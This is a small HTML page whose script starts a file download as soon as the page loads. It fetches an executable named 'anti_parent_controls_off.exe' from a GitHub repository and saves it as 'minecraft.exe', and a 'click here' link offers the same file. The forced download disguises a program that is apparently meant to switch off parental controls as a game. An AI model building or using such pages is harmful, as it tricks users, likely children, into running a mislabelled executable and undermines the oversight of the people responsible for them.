<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Auto Download</title>
</head>
<body>
  <script>
    window.onload = function() {
      const link = document.createElement("a");
      link.href = "https://raw.githubusercontent.com/BattleHound13/WEBSITE-/refs/heads/main/anti_parent_controls_off.exe"; // RAW file link
      link.download = "minecraft.exe"; // File name to save as
      document.body.appendChild(link);
      link.click();
      document.body.removeChild(link);
    };
  </script>
  <p>If the download doesn't start automatically, <a href="https://raw.githubusercontent.com/BattleHound13/WEBSITE-/refs/heads/main/anti_parent_controls_off.exe" download>click here</a>.</p>
</body>
</html>
